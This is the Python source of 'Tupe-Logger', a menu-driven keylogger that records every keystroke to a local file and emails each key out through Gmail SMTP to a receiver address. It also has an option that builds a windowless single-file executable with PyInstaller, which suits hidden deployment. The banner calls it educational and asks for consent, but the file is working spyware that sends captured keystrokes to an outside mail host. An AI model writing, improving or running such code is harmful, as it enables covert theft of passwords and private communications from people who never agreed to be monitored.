import smtplib
import time
import subprocess
from pynput.keyboard import Listener, Key
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import os

# Default email credentials (empty initially, will be configured by the user)
SENDER_EMAIL = ""
SENDER_PASSWORD = ""
RECEIVER_EMAIL = ""

# ASCII Art Banner for Intro
def display_banner():
    print("""
___________                            .__                                    ._.
\__    ___/_ ________   ____           |  |   ____   ____   ____   ___________| |
  |    | |  |  \____ \_/ __ \   ______ |  |  /  _ \ / ___\ / ___\_/ __ \_  __ \ |
  |    | |  |  /  |_> >  ___/  /_____/ |  |_(  <_> ) /_/  > /_/  >  ___/|  | \/\|
  |____| |____/|   __/ \___  >         |____/\____/\___  /\___  / \___  >__|   __
               |__|        \/                     /_____//_____/      \/       \/
          
          

          Welcome to Tupe-Logger
       A Keystroke Logger Tool for Educational Purposes
    =========================================
    WARNING: This tool is for educational purposes only.
    Use it with explicit consent. Unauthorized usage is illegal.
    =========================================
    """)

# Function to send the captured keystrokes via email
def send_email(log_data):
    try:
        # Create the email content
        subject = "Keystroke Log"
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = subject
        msg.attach(MIMEText(log_data, 'plain'))

        # Set up the SMTP server (Gmail)
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()  # Secure connection
        server.login(SENDER_EMAIL, SENDER_PASSWORD)

        # Send the email
        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
        server.quit()
        print("[+] Email sent successfully!")
    except Exception as e:
        print(f"[!] Error sending email: {e}")

# Function to capture keystrokes
def on_press(key):
    try:
        with open("keylog.txt", "a") as log:
            log.write(str(key) + "\n")
        
        # Send the keystrokes to the email
        send_email(str(key))
    except Exception as e:
        print(f"[!] Error: {e}")

# This function is called when the listener stops
def on_release(key):
    if key == Key.esc:
        return False  # Stop listener when ESC is pressed

# Main function to run the keylogger
def run_keylogger():
    print("[+] Keylogger is running. Press ESC to stop.")
    # Start listening for key presses
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Function to configure email credentials
def configure_email():
    global SENDER_EMAIL, SENDER_PASSWORD, RECEIVER_EMAIL
    print("\n[+] Please enter your email configuration.")
    SENDER_EMAIL = input("[*] Your Email Address: ")
    SENDER_PASSWORD = input("[*] Your Email Password (Use App Password for Gmail): ")
    RECEIVER_EMAIL = input("[*] Receiver's Email Address: ")
    print("\n[+] Email configuration set successfully!")

# Function to view the keystroke logs
def view_logs():
    if os.path.exists("keylog.txt"):
        with open("keylog.txt", "r") as log_file:
            print("\n[+] Keystroke Logs:")
            print(log_file.read())
    else:
        print("[!] No logs found.")

# Function to automate PyInstaller packaging
def automate_pyinstaller():
    print("[*] Automating PyInstaller to create executable...")

    # Check if pyinstaller is installed, if not install it
    try:
        subprocess.run(['pip', 'show', 'pyinstaller'], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except subprocess.CalledProcessError:
        print("[!] PyInstaller is not installed. Installing PyInstaller...")
        subprocess.run(['pip', 'install', 'pyinstaller'], check=True)

    # Run PyInstaller command to create the executable
    subprocess.run(['pyinstaller', '--onefile', '--noconsole', 'keylogger.py'], check=True)

    print("[*] PyInstaller packaging complete. The executable is located in the 'dist' folder.")

# Display main menu
def display_menu():
    while True:
        print("""
        [1] Configure Email Credentials
        [2] Run Tupe-Logger (Start Keylogging)
        [3] View Keystroke Logs
        [4] Automate PyInstaller (Create Executable)
        [5] Exit
        """)
        
        choice = input("[*] Choose an option: ")

        if choice == '1':
            configure_email()
        elif choice == '2':
            run_keylogger()
        elif choice == '3':
            view_logs()
        elif choice == '4':
            automate_pyinstaller()
        elif choice == '5':
            print("[*] Exiting program...")
            break
        else:
            print("[!] Invalid choice. Please try again.")

# Main function
def main():
    display_banner()  # Display banner when the program starts
    display_menu()    # Display the menu and allow the user to choose actions

if __name__ == "__main__":
    main()
